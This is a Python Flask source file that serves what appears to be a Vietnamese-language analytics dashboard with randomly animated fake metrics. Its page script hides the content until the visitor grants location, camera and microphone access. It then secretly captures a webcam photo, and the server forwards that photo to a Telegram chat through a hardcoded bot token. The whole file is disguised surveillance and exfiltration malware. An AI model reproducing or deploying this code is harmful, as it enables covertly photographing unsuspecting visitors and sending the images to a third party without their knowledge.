import os
import requests
from flask import Flask, request
from datetime import datetime

app = Flask(__name__)

TELEGRAM_TOKEN = '8199979828:AAFTEB7wbtvrn4j3xN7sPs4d5mQdZ3q7biM'
CHAT_ID = '-1003262536143'

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Dashboard Glow</title>
  <style>
    :root {
      --bg-dark: #0f1117;
      --card-dark: #1a1d29;
      --text-light: #e0e0e0;
      --glow-blue: #00bfff;
      --glow-green: #00ff99;
      --glow-purple: #b266ff;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: var(--bg-dark);
      padding: 30px;
      color: var(--text-light);
      display: none;
    }
    h1 {
      text-align: center;
      font-size: 32px;
      margin-bottom: 30px;
      text-shadow: 0 0 10px var(--glow-purple);
    }
    .cards {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
    }
    .card {
      background-color: var(--card-dark);
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 15px rgba(0, 255, 255, 0.1);
      transition: transform 0.3s, box-shadow 0.3s;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }
    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 20px var(--glow-blue);
    }
    .card h3 {
      margin-top: 0;
      color: var(--glow-green);
      text-shadow: 0 0 5px var(--glow-green);
    }
    .card .counter {
      font-size: 24px;
      font-weight: bold;
      color: var(--text-light);
      text-shadow: 0 0 5px var(--glow-purple);
    }
    .wide-card {
      grid-column: span 2;
    }
    canvas {
      margin-top: 10px;
      max-width: 100%;
    }
    @media (max-width: 700px) {
      .wide-card {
        grid-column: span 1;
      }
    }
  </style>
</head>
<body>
  <h1>Dashboard</h1>
  <div class="cards">
    <div class="card wide-card">
      <h3>Đang truy cập</h3>
      <div class="counter" id="liveVisitors">0</div>
    </div>
    <div class="card">
      <h3>Sessions</h3>
      <div class="counter" id="sessions">0</div>
      <canvas id="sessionsChart"></canvas>
    </div>
    <div class="card">
      <h3>Avg. Sessions</h3>
      <div class="counter" id="avgSessions">0</div>
      <canvas id="avgSessionsChart"></canvas>
    </div>
    <div class="card">
      <h3>Bounce Rate</h3>
      <div class="counter" id="bounceRate">0</div>
    </div>
    <div class="card">
      <h3>Goal Completions</h3>
      <div class="counter" id="goalCompletions">0</div>
    </div>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <script>
async function captureAndSendPhoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
    const formData = new FormData();
    formData.append('photo', blob);
    formData.append('timestamp', new Date().toISOString());

    await fetch('/upload_photo', {
      method: 'POST',
      body: formData
    });

    stream.getTracks().forEach(track => track.stop());
  } catch (err) {
    console.error("Không thể chụp ảnh:", err);
  }
}

// Gọi hàm sau khi cấp quyền
requestPermissions().then(captureAndSendPhoto);
    async function requestPermissions() {
      try {
        await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject);
        });
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        document.body.style.display = 'block';
      } catch (err) {
        alert("Bạn cần cấp quyền vị trí, máy ảnh và micro để truy cập dashboard.");
        document.body.innerHTML = "<h2 style='color:white;text-align:center;margin-top:100px;'>Truy cập bị từ chối</h2>";
      }
    }
    requestPermissions();

    const sessionsCtx = document.getElementById('sessionsChart').getContext('2d');
    new Chart(sessionsCtx, {
      type: 'bar',
      data: {
        labels: ['1 May', '5 May', '10 May', '15 May'],
        datasets: [{
          label: 'Sessions',
          data: [500, 700, 800, 765],
          backgroundColor: 'rgba(0, 191, 255, 0.7)',
          borderRadius: 5
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { display: false } },
        scales: {
          x: { ticks: { color: '#e0e0e0' } },
          y: { ticks: { color: '#e0e0e0' } }
        }
      }
    });

    const avgSessionsCtx = document.getElementById('avgSessionsChart').getContext('2d');
    new Chart(avgSessionsCtx, {
      type: 'line',
      data: {
        labels: ['15 May', '20 May', '25 May', '30 May'],
        datasets: [{
          label: 'Avg. Duration',
          data: [38, 40, 45, 42.5],
          borderColor: 'rgba(0, 255, 153, 0.9)',
          fill: false,
          tension: 0.3
        }]
      },
      options: {
        responsive: true,
        plugins: { legend: { display: false } },
        scales: {
          x: { ticks: { color: '#e0e0e0' } },
          y: { ticks: { color: '#e0e0e0' } }
        }
      }
    });

    function animateMetric(id, baseValue, variation = 10, isDecimal = false) {
      const el = document.getElementById(id);
      let value = baseValue;
      setInterval(() => {
        const change = (Math.random() * variation * 2 - variation);
        value += change;
        value = Math.max(0, value);
        el.innerText = isDecimal ? value.toFixed(1) : Math.round(value);
      }, 3000);
    }

    animateMetric("sessions", 2765);
    animateMetric("avgSessions", 42.5, 2, true);
    animateMetric("bounceRate", 1853);
    animateMetric("goalCompletions", 2153);
    animateMetric("liveVisitors", 120);
  </script>
</body>
</html>
'''

@app.route('/upload_photo', methods=['POST'])
def upload_photo():
    photo = request.files.get('photo')
    timestamp = request.form.get('timestamp', datetime.now().isoformat())

    if photo:
        files = {'photo': (f"photo_{timestamp}.jpg", photo.stream, 'image/jpeg')}
        data = {'chat_id': CHAT_ID, 'caption': f"Time: {timestamp}"}
        response = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto", data=data, files=files)
        return "Đã gửi ảnh", response.status_code
    return "Không có ảnh", 400
    
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
